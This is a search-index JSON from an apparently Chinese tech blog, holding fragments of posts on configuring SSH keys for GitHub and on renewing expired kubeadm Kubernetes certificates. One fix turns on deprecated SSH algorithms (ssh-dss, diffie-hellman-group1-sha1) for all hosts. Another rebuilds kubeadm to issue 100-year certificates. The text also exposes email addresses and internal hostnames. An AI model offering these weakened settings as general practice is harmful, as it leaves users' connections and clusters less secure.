AAAAB3NzaC1yc0EAAAADAQABAAACAQCtnLpzoVOiv2ABq+n/cexRh1aAyqpjFvSDx20GEG96DW8Q4PEbBcn6Mb/E3F3wTjI+2Hv5Gw3aoQ6JN8McqqPaeqzj82QKIjQFwah4RQNISUn39au7MpWfWpolQOv1YiJvq+GKaVfK2LBaq5hHx6Y6UpV1aJWics91SIWp3wg0MBMC0apSMwtCbbeNqb+4KpV1C5Sq9+qIeEEMnDS/SBKHh8tuRoGvUa5i39LTNLY3UM4Hqml78UnlzpOaobuFE4BgtWkYNQoDCkt9/6xKyh3JB+yKIDystfhWFBNUHF3Of6Zkfi95zG9ra/CzyPyTgRgyYtuje+uhlviIUMyg66c5crAgG8SVSqYuYhBrSVB72S02SIi2g6q2k8BAspnV3ZqO+KzC+KpYj5mYboQP6X2SyTbZB9w6f7TKYHoNb9jIF0xXNJOStf5gjs7YGf+PGrDcPuzuakmOKLCh2PEA+Y60VVpqHgK/H0EPUu0a/H4h1gsDIry5Xps4Pl/sGvgZ1JkdBTlcV45v3T4o9BvLa7cpf/IF0+NsVhENBg5JLJ2tFLFnhq60bP9aTqEiAeK4iFY4ee1aADR/szb5/FZg7YQvRezhAkuH0nTardb89FwDV4AnS3QObTBLDZqemRnRlW9SVhlpz68pvV7ht71jInnLwvD0/5zbnpdTIRmFKTp/Ew== 51482508@qq.com 全给复制下来！ ","date":"2023-10-12","objectID":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/:4:1","tags":["Git"],"title":"配置ssh方式连接git","uri":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/"},{"categories":["Git"],"content":"4、2 将公钥添加到 github 账户 然后去 gihub： 右上角下拉面板选择 Settings； 左侧选择 SSH and GPG keys； 点击 New SSH key； 随便起一个 title； 把公钥粘贴到下面。 可能会输入密码，添加完成！ ","date":"2023-10-12","objectID":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/:4:2","tags":["Git"],"title":"配置ssh方式连接git","uri":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/"},{"categories":["Git"],"content":"5 测试 ssh 连接 在终端中输入： $ ssh -T git@github.com 可能看到如下警告： $ ssh -T git@github.com The authenticity of host 'github.com (20.205.243.166)' can't be established. ED25519 key fingerprint is SHA256:+DiY3wvvV6TuJJhbpZisF/zLDA0zPMSvHdkr4UvCOqU. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'github.com' (ED25519) to the list of known hosts. Hi Chaggai7! You've successfully authenticated, but GitHub does not provide shell access. 输入 yes： $ ssh -T git@github.com The authenticity of host 'github.com (20.205.243.166)' can't be established. ED25519 key fingerprint is SHA256:+DiY3wvvV6TuJJhbpZisF/zLDA0zPMSvHdkr4UvCOqU. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'github.com' (ED25519) to the list of known hosts. Hi Chaggai7! You've successfully authenticated, but GitHub does not provide shell access. 如果 xxxxxx 是你的 github 用户名，说明成功。 ","date":"2023-10-12","objectID":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/:5:0","tags":["Git"],"title":"配置ssh方式连接git","uri":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/"},{"categories":["Git"],"content":"6 配置 git 使用 ssh 密钥登录 首先将你的仓库 clone 下来到一个位置。然后进入你的仓库。 ","date":"2023-10-12","objectID":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/:6:0","tags":["Git"],"title":"配置ssh方式连接git","uri":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/"},{"categories":["Git"],"content":"6.1 检查当前的 remote url 在仓库下输入： $ git remote -v 看到输出： origin https://xxxxx.git (fetch) origin https://xxxxx.git (push) 说明当前使用的还是 https 协议，如果以 git 开头表示 git 协议。 github把master默认分支改为了main, 为了适应它这种政治正确的变化, 我们也要做相应调整, 把本地git的master改成main. 其实所谓的把master改成main, 只不过是修改git的配置文件而已, 毕竟不管任何应用程序, 能灵活改动的地方必然就是配置文件. 前置提示 请使用2.28版本以后的git 默认分支和主分支我这里是一个意思, 毕竟在没创建项目前叫默认分支, 但创建项目后一般都会用默认分支作为主分支 把默认分支改为main windows中git的配置文件在C:\\Users\\\u003c用户名\u003e下 经过上面的修改, 当我们使用git init初始化某个项目的时候, 默认就会使用main做为主分支 除了手动修改配置文件外, 也可以使用git命令, 效果和手动修改没区别 git config --global init.defaultBranch main 以上方法只是让以后创建的项目默认分支为main, 但对于已经创建的项目则无能为力, 所以我们还需要对已存在的项目逐个进行修改. 修改已创建项目的主分支为main 切换到主分支master 使用git branch -M main命令, 把当前master分支改名为main, 其中-M的意思是移动或者重命名当前分支 此时你可能困在master和main的区别上，仔细看你的gitbash是不是main，有可能是master，如下： ~~~ SE@DESKTOP-88 MINGW64 /f/share/git (master) ~~~~ github在2020/10/1宣布上的所有新库都将用中性词「main」命名，取代原来的「master」，如果我们通过git push -u grigin master 方法上传仓库，在github仓库中就会出现一个master的分支。 现在都2023年了。这时候当然需要调整回main： git config --global init.defaultBranch main ","date":"2023-10-12","objectID":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/:6:1","tags":["Git"],"title":"配置ssh方式连接git","uri":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/"},{"categories":["Git"],"content":"6.2 修改 remote url 为 git 协议 上 github 仓库，点 Code，选择 SSH，复制链接：如下 git@github.com:MaartenBaert/ssr.git 注意不是 https://github.com/MaartenBaert/ssr.git 在终端输入： $ git remote set-url origin git@github.com:xxxxx.git 再检查 git 协议： $ git remote -v 出现： origin git@xxxxx.git (fetch) origin git@xxxxx.git (push) successed！ 接下来可以愉快的 push\u0026pull 了。 如果你真的坑在master和main的问题上按照上面如法炮制即可。最后说一下这个邮箱是任意手写的别介意啊！你可以使用你自己的。 ","date":"2023-10-12","objectID":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/:6:2","tags":["Git"],"title":"配置ssh方式连接git","uri":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/"},{"categories":["Git"],"content":"7 附录 开始配置 1、下载并且安装git 2、第一次配置SSH （1）打开Git Bash，若是首次安装使用git，先配置用户名称和邮箱 #git config --global user.name \"姓名\" #git config --global user.email \"邮箱地址\" git config --global user.name \"wangb072\" git config --global user.email \"wangb072@chinatelecom.cn\" 如果不是首次使用git,那么可以先查看自己的用户名以及邮箱： git config user.name git config user.email （2）生成密钥 #ssh-keygen -t rsa -C \"你的邮箱地址\" #ssh-keygen -t rsa -C \"wangb072@chinatelecom.cn\" ssh-keygen -m PEM -t rsa -C wangb072@chinatelecom.cn -b 4096 生成密钥前 dragon@LAPTOP-UB9FPVOU MINGW64 / $ ls -al ~/.ssh total 13 drwxr-xr-x 1 dragon 197121 0 Oct 23 15:38 ./ drwxr-xr-x 1 dragon 197121 0 Nov 15 19:12 ../ -rw-r--r-- 1 dragon 197121 356 Nov 6 10:06 known_hosts dragon@LAPTOP-UB9FPVOU MINGW64 / 生成密钥后 dragon@LAPTOP-UB9FPVOU MINGW64 / $ ssh-keygen -t rsa -C \"wangb072@chinatelecom.cn\" Generating public/private rsa key pair. Enter file in which to save the key (/c/Users/dragon/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /c/Users/dragon/.ssh/id_rsa Your public key has been saved in /c/Users/dragon/.ssh/id_rsa.pub The key fingerprint is: SHA256:1rZkqeSa5bVCJVQM4kz7xBkXRy+8xUkJe68P31t61vw wangb072@chinatelecom.cn The key's randomart image is: +---[RSA 3072]----+ | o o++o+... | | + +.+.o =.. | | +.+ + * | | o.... = . | | So* . .| | +.= . . | | .+ o o.o| | =.. . =B| | o ... .+E| +----[SHA256]-----+ dragon@LAPTOP-UB9FPVOU MINGW64 / $ dragon@LAPTOP-UB9FPVOU MINGW64 / $ ls -al ~/.ssh total 18 drwxr-xr-x 1 dragon 197121 0 Nov 20 09:04 ./ drwxr-xr-x 1 dragon 197121 0 Nov 20 09:03 ../ -rw-r--r-- 1 dragon 197121 2610 Nov 20 09:04 id_rsa -rw-r--r-- 1 dragon 197121 578 Nov 20 09:04 id_rsa.pub -rw-r--r-- 1 dragon 197121 356 Nov 6 10:06 known_hosts 打开id_rsa.pub，并且复制里面的密钥 cat ~/.ssh/id_rsa.pub dragon@LAPTOP-UB9FPVOU MINGW64 / $ cat ~/.ssh/id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDiBgZlQ/Q5MGHyf1nv1s82SS+yWLHa6YzIc/jkH441iHywOqIpTkynT2VcHL+9ut27W2soArOKzy2fNOu3cmQbPR4Rf+40lAczZZ7dDmeZA4Dyg1Rhzbyovnb2yUY6jtASBn3RDMvC1QAOcfoYb+8HiHFX88I+hab7RuuSVgcgFhOAV4KIGIhyIBi/KL5ar9Y+0L7LgIoQ2IP8FaqcJd58up2tQdidST6UtIu9pLxgd2e1H+SaTR7M1a30nHQeOCpi5dBp59V0oPvJs7b6sKLPufWFANzJlokBP4iSqiX27OFQx9ZcBSBpLbVNXsn6pEfEni66R31pi/kRBePP6oIsaX2FpQcvEHqQe3RxyNmGe1lvCJ25CeSOhIOljSyKMUFulKJ2CmKNrQyufD/dizHYrkclBJGccIk+WJlRbHc8YZPXp6HfXWhIDF5iLw6Zzy2gnYJvJpWHFWsULDMg6lVYhPncRHQK92W5Vjg0Bk0Fjy8RfFyZi5WEWZJUUwufSRU= wangb072@chinatelecom.cn dragon@LAPTOP-UB9FPVOU MINGW64 / $ ","date":"2023-10-12","objectID":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/:7:0","tags":["Git"],"title":"配置ssh方式连接git","uri":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/"},{"categories":["Git"],"content":"8 问题报错 ","date":"2023-10-12","objectID":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/:8:0","tags":["Git"],"title":"配置ssh方式连接git","uri":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/"},{"categories":["Git"],"content":"git clone 项目失败 dragon@LAPTOP-UB9FPVOU MINGW64 /d/GoProject $ git clone ssh://wangb072@code.srdcloud.cn:29418/CTDICaaS/ctdi-caas-kubesphere \u0026\u0026 scp -p -P 29418 wangb072@code.srdcloud.cn:hooks/commit-msg ctdi-caas-kubesphere/.git/hooks/ Cloning into 'ctdi-caas-kubesphere'... Unable to negotiate with 10.158.231.11 port 29418: no matching host key type found. Their offer: ssh-rsa,ssh-dss fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists. dragon@LAPTOP-UB9FPVOU MINGW64 /d/GoProject 添加修改~/.ssh/Config，如果原来已有~/.ssh/Config，请备份 #touch ~/.ssh/Config vi ~/.ssh/Config 填写如下内容 Host * HostkeyAlgorithms +ssh-dss,ssh-rsa PubkeyAcceptedKeyTypes +ssh-dss,ssh-rsa $ cat ~/.ssh/Config Host * HostkeyAlgorithms +ssh-dss,ssh-rsa PubkeyAcceptedKeyTypes +ssh-dss,ssh-rsa Host * KexAlgorithms +diffie-hellman-group1-sha1 HostkeyAlgorithms +ssh-dss,ssh-rsa PubkeyAcceptedKeyTypes +ssh-dss,ssh-rsa ","date":"2023-10-12","objectID":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/:8:1","tags":["Git"],"title":"配置ssh方式连接git","uri":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/"},{"categories":["Git"],"content":"在windows的gitbash中，git add时出现如下告警信息 LF will be replaced by CRLF the next time Git touches it Windows组合使用了CRLF（0x0D 0x0A, \\r\\n），无疑是符合标准语义的做法。 尽管这不是一个Bug或错误，但还是可以通过如下方式对Git进行配置，以避免在每次提交代码时显示： # Linux/macOS系统下在提交代码时自动将CRLF转换为LF git config --global core.autocrlf input # Windows系统下在提交代码时自动将LF转换为CRLF git config --global core.autocrlf true # Windows系统下在提交检出均不转换 git config --global core.autocrlf false 实际执行如下： 提交时转换为LF，检出时不转换 # Linux/macOS系统下在提交代码时自动将CRLF转换为LF git config --global core.autocrlf input dragon@LAPTOP-UB9FPVOU MINGW64 /d/GoProject/ctdi-caas-kubesphere (master) $ git add -A warning: in the working copy of '.github/release-drafter.yml', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of '.github/workflows/release-drafter.yml', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of 'pkg/simple/client/monitoring/metricsserver/testdata/metrics-matrix-1.json', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of 'pkg/simple/client/monitoring/metricsserver/testdata/metrics-matrix-2.json', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of 'pkg/simple/client/monitoring/metricsserver/testdata/metrics-matrix-3.json', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of 'pkg/simple/client/monitoring/metricsserver/testdata/metrics-matrix-4.json', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of 'pkg/simple/client/monitoring/metricsserver/testdata/metrics-matrix-5.json', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of 'pkg/simple/client/monitoring/metricsserver/testdata/metrics-matrix-6.json', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of 'pkg/simple/client/monitoring/metricsserver/testdata/metrics-matrix-7.json', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of 'pkg/simple/client/monitoring/metricsserver/testdata/metrics-matrix-8.json', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of 'pkg/simple/client/monitoring/metricsserver/testdata/metrics-vector-1.json', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of 'pkg/simple/client/monitoring/metricsserver/testdata/metrics-vector-2.json', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of 'pkg/simple/client/monitoring/metricsserver/testdata/metrics-vector-3.json', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of 'pkg/simple/client/monitoring/metricsserver/testdata/metrics-vector-4.json', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of 'pkg/simple/client/monitoring/metricsserver/testdata/metrics-vector-5.json', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of 'pkg/simple/client/monitoring/metricsserver/testdata/metrics-vector-6.json', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of 'pkg/simple/client/monitoring/metricsserver/testdata/metrics-vector-7.json', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of 'pkg/simple/client/monitoring/metricsserver/testdata/metrics-vector-8.json', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of 'vendor/github.com/MakeNowJust/heredoc/README.md', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of 'vendor/github.com/go-logfmt/logfmt/README.md', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of 'vendor/github.com/gosimple/slug/.gitignore', CRLF will be replaced by LF the next time Git touches it warning: in the working copy of 'vendor/github.com/gosimple/slug/README.md', CRLF will be replaced b","date":"2023-10-12","objectID":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/:8:2","tags":["Git"],"title":"配置ssh方式连接git","uri":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/"},{"categories":["Git"],"content":"9 参考 https://www.cnblogs.com/lyndonlu/articles/16919707.html https://blog.csdn.net/xinlingncut/article/details/130811590 ","date":"2023-10-12","objectID":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/:9:0","tags":["Git"],"title":"配置ssh方式连接git","uri":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/"},{"categories":["K8S"],"content":"如果k8s证书过期，会导致服务连接不可用，需要进行k8s证书更新操作 ","date":"2023-07-22","objectID":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/:0:0","tags":["K8S"],"title":"k8s证书更新","uri":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/"},{"categories":["K8S"],"content":"k8s证书过期检查 通过 kubeadm 安装的 k8s 集群，证书有效期为 1年，一年过期后，会导致 api service 不可用，使用过程中会出现报错： x509: certificate has expired or is not yet valid. 通过实测，记录两种切实可用的方案： 手动更新证书（证书已过期也可用）； 源码编译kubeadm，使证书时间更长（集群证书已过期也可用） 系统版本 System: CentOS Linux release 7.9.2009 (Core) kernel: 3.10.0-1160.el7.x86_64 docker版本 Server: 18.06.3-ce Client: 18.06.3-ce Kubernetes 版本 v1.19.7 在 master 上使用如下命令查看证书过期时间： kubeadm alpha certs check-expiration root@k8s-master(10.0.0.11)~\u003ekubeadm alpha certs check-expiration [check-expiration] Reading configuration from the cluster... [check-expiration] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -oyaml' [check-expiration] Error reading configuration from the Cluster. Falling back to default configuration W0818 15:09:56.236357 4122 configset.go:348] WARNING: kubeadm cannot validate component configs for API groups [kubelet.config.k8s.io kubeproxy.config.k8s.io] CERTIFICATE EXPIRES RESIDUAL TIME CERTIFICATE AUTHORITY EXTERNALLY MANAGED admin.conf Aug 18, 2022 07:04 UTC \u003cinvalid\u003e no apiserver Aug 18, 2022 07:04 UTC \u003cinvalid\u003e ca no apiserver-etcd-client Aug 18, 2022 07:04 UTC \u003cinvalid\u003e etcd-ca no apiserver-kubelet-client Aug 18, 2022 07:04 UTC \u003cinvalid\u003e ca no controller-manager.conf Aug 18, 2022 07:04 UTC \u003cinvalid\u003e no etcd-healthcheck-client Aug 18, 2022 07:04 UTC \u003cinvalid\u003e etcd-ca no etcd-peer Aug 18, 2022 07:04 UTC \u003cinvalid\u003e etcd-ca no etcd-server Aug 18, 2022 07:04 UTC \u003cinvalid\u003e etcd-ca no front-proxy-client Aug 18, 2022 07:04 UTC \u003cinvalid\u003e front-proxy-ca no scheduler.conf Aug 18, 2022 07:04 UTC \u003cinvalid\u003e no CERTIFICATE AUTHORITY EXPIRES RESIDUAL TIME EXTERNALLY MANAGED ca Aug 16, 2031 07:04 UTC 8y no etcd-ca Aug 16, 2031 07:04 UTC 8y no front-proxy-ca Aug 16, 2031 07:04 UTC 8y no 该命令显示 /etc/kubernetes/pki 文件夹中的客户端证书以及 kubeadm 使用的 KUBECONFIG 文件中嵌入的客户端证书的到期时间/剩余时间。 也可通过如下命令查看证书详细时间： openssl x509 -in /etc/kubernetes/pki/apiserver.crt -noout -text | egrep Not openssl x509 -in /etc/kubernetes/pki/apiserver.crt -noout -text | egrep Not Not Before: Aug 18 07:24:06 2021 GMT Not After : Aug 18 07:24:06 2022 GMT 执行和 api service的交互报错如下： root@k8s-master(10.0.0.11)~\u003ekubectl get po Unable to connect to the server: x509: certificate has expired or is not yet valid: current time 2022-08-18T15:10:07+08:00 is after 2022-08-18T07:04:33Z 以上错误表示证书到期，可用如下两种方式进行更新。 ","date":"2023-07-22","objectID":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/:1:0","tags":["K8S"],"title":"k8s证书更新","uri":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/"},{"categories":["K8S"],"content":"手动更新证书 1. 备份 注意：做任何改动之前都需要进行源文件备份 mkdir -pv /etc/kubernetes-bak cp -r /etc/kubernetes/pki /etc/kubernetes-bak/ cp /etc/kubernetes/*.conf /etc/kubernetes-bak/ etcd 数据目录备份： cp -ar /var/lib/etcd /var/lib/etcd-bak 2. 执行更新证书 kubeadm alpha certs renew all kubeadm alpha certs renew all [renew] Reading configuration from the cluster... [renew] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -oyaml' [renew] Error reading configuration from the Cluster. Falling back to default configuration W0818 15:46:40.020407 3775 configset.go:348] WARNING: kubeadm cannot validate component configs for API groups [kubelet.config.k8s.io kubeproxy.config.k8s.io] certificate embedded in the kubeconfig file for the admin to use and for kubeadm itself renewed certificate for serving the Kubernetes API renewed certificate the apiserver uses to access etcd renewed certificate for the API server to connect to kubelet renewed certificate embedded in the kubeconfig file for the controller manager to use renewed certificate for liveness probes to healthcheck etcd renewed certificate for etcd nodes to communicate with each other renewed certificate for serving etcd renewed certificate for the front proxy client renewed certificate embedded in the kubeconfig file for the scheduler manager to use renewed 通过上面的命令证书就一键更新完成了，这个时候查看上面的证书可以看到过期时间已经是一年后的时间了： kubeadm alpha certs check-expiration root@k8s-master(10.0.0.11)~\u003ekubeadm alpha certs check-expiration [check-expiration] Reading configuration from the cluster... [check-expiration] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -oyaml' [check-expiration] Error reading configuration from the Cluster. Falling back to default configuration W0818 15:47:22.712349 3834 configset.go:348] WARNING: kubeadm cannot validate component configs for API groups [kubelet.config.k8s.io kubeproxy.config.k8s.io] CERTIFICATE EXPIRES RESIDUAL TIME CERTIFICATE AUTHORITY EXTERNALLY MANAGED admin.conf Aug 18, 2023 07:46 UTC 364d no apiserver Aug 18, 2023 07:46 UTC 364d ca no apiserver-etcd-client Aug 18, 2023 07:46 UTC 364d etcd-ca no apiserver-kubelet-client Aug 18, 2023 07:46 UTC 364d ca no controller-manager.conf Aug 18, 2023 07:46 UTC 364d no etcd-healthcheck-client Aug 18, 2023 07:46 UTC 364d etcd-ca no etcd-peer Aug 18, 2023 07:46 UTC 364d etcd-ca no etcd-server Aug 18, 2023 07:46 UTC 364d etcd-ca no front-proxy-client Aug 18, 2023 07:46 UTC 364d front-proxy-ca no scheduler.conf Aug 18, 2023 07:46 UTC 364d no CERTIFICATE AUTHORITY EXPIRES RESIDUAL TIME EXTERNALLY MANAGED ca Aug 16, 2031 07:39 UTC 8y no etcd-ca Aug 16, 2031 07:39 UTC 8y no front-proxy-ca Aug 16, 2031 07:39 UTC 8y no 3. 更新 kubeconfig 文件 kubeadm init phase kubeconfig all root@k8s-master(10.0.0.11)~\u003ekubeadm init phase kubeconfig all I0818 15:48:50.617013 3929 version.go:252] remote version is much newer: v1.24.4; falling back to: stable-1.19 W0818 15:48:52.891141 3929 configset.go:348] WARNING: kubeadm cannot validate component configs for API groups [kubelet.config.k8s.io kubeproxy.config.k8s.io] [kubeconfig] Using kubeconfig folder \"/etc/kubernetes\" [kubeconfig] Using existing kubeconfig file: \"/etc/kubernetes/admin.conf\" [kubeconfig] Using existing kubeconfig file: \"/etc/kubernetes/kubelet.conf\" [kubeconfig] Using existing kubeconfig file: \"/etc/kubernetes/controller-manager.conf\" [kubeconfig] Using existing kubeconfig file: \"/etc/kubernetes/scheduler.conf\" 4. 覆盖原admin文件 mv $HOME/.kube/config $HOME/.kube/config.old cp -i /etc/kubernetes/admin.conf $HOME/.kube/config chown $(id -u):$(id -g) $HOME/.kube/config 5. 重启容器 重启 kube-apiserver、kube-controller、kube-scheduler、etcd 这4个容器即可 docker restart `docker ps | grep etcd | awk '{print $1}'` docker restart `docker ps | grep kube-apiserver | awk '{print $1}'` docker restart `docker ps | grep kube-controller | awk '{print $1}'` docker restart `docker ps | grep kube-scheduler | awk '{print $1}'` 6. 验证是否认证成功 查看pod集群状态，检查刚刚重启的status是否为Running(一般会等待2","date":"2023-07-22","objectID":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/:2:0","tags":["K8S"],"title":"k8s证书更新","uri":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/"},{"categories":["K8S"],"content":"源码编译kubeadm 可以在初始化集群之前重新编译 kubeadm，证书有限期可自行指定。 新建集群如下操作： 1. 获取源码 如果集群已经初始化完成，请下载对应版本的源代码进行操作。 我这里的版本为 v1.19.7 去 github 下载对应版本的源代码进行修改编译。 注意：版本一定要一致！ wget https://github.com/kubernetes/kubernetes/archive/v1.19.7.tar.gz tar -zxvf v1.19.7.tar.gz mv kubernetes-1.19.7 kubernetes cd kubernetes 2. 修改CA为100年 \u003evim ./staging/src/k8s.io/client-go/util/cert/cert.go ... func NewSelfSignedCACert(cfg Config, key crypto.Signer) (*x509.Certificate, error) { now := time.Now() tmpl := x509.Certificate{ SerialNumber: new(big.Int).SetInt64(0), Subject: pkix.Name{ CommonName: cfg.CommonName, Organization: cfg.Organization, }, NotBefore: now.UTC(), NotAfter: now.Add(duration365d * 100).UTC(), # 这里10修改为100 ... \u003evim ./cmd/kubeadm/app/constants/constants.go ... const ( // KubernetesDir is the directory Kubernetes owns for storing various configuration files KubernetesDir = \"/etc/kubernetes\" // ManifestsSubDirName defines directory name to store manifests ManifestsSubDirName = \"manifests\" // TempDirForKubeadm defines temporary directory for kubeadm // should be joined with KubernetesDir. TempDirForKubeadm = \"tmp\" // CertificateValidity defines the validity for all the signed certificates generated by kubeadm CertificateValidity = time.Hour * 24 * 365 * 100 # 这里乘以 100 年 ... 3. 本地编译 yum install -y gcc make jq rsync 4. 安装go环境 查看 kube-cross 的 TAG 版本号 cat ./build/build-image/cross/VERSION v1.15.5-1 下载go，上传到 master节点 https://gomirrors.org/dl/go/go1.15.1.linux-amd64.tar.gz \u003etar xf go1.15.Linux-amd64.tar.gz -C /usr/local/ # 编辑/etc/profile文件添加如下： \u003evim /etc/profile ... export GOROOT=/usr/local/go export GOPATH=/usr/local/gopath export PATH=$PATH:$GOROOT/bin \u003esource /etc/profile 验证： \u003ego version go version go1.15 linux/amd64 5. 编译kubeadm # 编译kubeadm, 这里主要编译kubeadm 即可 make all WHAT=cmd/kubeadm GOFLAGS=-v # 编译kubelet # make all WHAT=cmd/kubelet GOFLAGS=-v # 编译kubectl # make all WHAT=cmd/kubectl GOFLAGS=-v #编译完产物在 _output/bin/kubeadm 目录下， #其中bin是使用了软连接 #真实路径是_output/local/bin/Linux/amd64/kubeadm mv /usr/bin/kubeadm /usr/bin/kubeadm_backup cp _output/local/bin/Linux/amd64/kubeadm /usr/bin/kubeadm chmod +x /usr/bin/kubeadm 6. 更新证书 查看证书到期时间： kubeadm alpha certs check-expiration 续订全部证书： kubeadm alpha certs renew all 再次查看证书到期时间： root@k8s-master(10.0.0.11)~\u003ekubeadm alpha certs check-expiration [check-expiration] Reading configuration from the cluster... [check-expiration] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -oyaml' CERTIFICATE EXPIRES RESIDUAL TIME CERTIFICATE AUTHORITY EXTERNALLY MANAGED admin.conf Jul 25, 2121 10:00 UTC 99y no apiserver Jul 25, 2121 10:00 UTC 99y ca no apiserver-etcd-client Jul 25, 2121 10:00 UTC 99y etcd-ca no apiserver-kubelet-client Jul 25, 2121 10:00 UTC 99y ca no controller-manager.conf Jul 25, 2121 10:00 UTC 99y no etcd-healthcheck-client Jul 25, 2121 10:00 UTC 99y etcd-ca no etcd-peer Jul 25, 2121 10:00 UTC 99y etcd-ca no etcd-server Jul 25, 2121 10:00 UTC 99y etcd-ca no front-proxy-client Jul 25, 2121 10:00 UTC 99y front-proxy-ca no scheduler.conf Jul 25, 2121 10:00 UTC 99y no CERTIFICATE AUTHORITY EXPIRES RESIDUAL TIME EXTERNALLY MANAGED ca Jul 25, 2121 10:00 UTC 99y no etcd-ca Jul 25, 2121 10:00 UTC 99y no front-proxy-ca Jul 25, 2121 10:00 UTC 99y no 如果集群证书已经过期，在上面的基础继续如下步骤： docker restart `docker ps | grep etcd | awk '{print $1}'` docker restart `docker ps | grep kube-apiserver | awk '{print $1}'` docker restart `docker ps | grep kube-controller | awk '{print $1}'` docker restart `docker ps | grep kube-scheduler | awk '{print $1}'` 更新 kubeconfig 文件 kubeadm init phase kubeconfig all root@k8s-master(10.0.0.11)~\u003ekubeadm init phase kubeconfig all I0818 15:48:50.617013 3929 version.go:252] remote version is much newer: v1.24.4; falling back to: stable-1.19 W0818 15:48:52.891141 3929 configset.go:348] WARNING: kubeadm cannot validate component configs for API groups [kubelet.config.k8s.io kubeproxy.config.k8s.io] [kubeconfig] Using kubeconfig folder \"/etc/kubernetes\" [kubeconfig] Using existing kub","date":"2023-07-22","objectID":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/:3:0","tags":["K8S"],"title":"k8s证书更新","uri":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/"},{"categories":["K8S"],"content":"操作命令备注 背景：K8S 各个组件需要与 api-server 进行通信，通信使用的证书都存放在 /etc/kubernetes/pki 路径下，kubeadm 生成的证书默认有效为 1 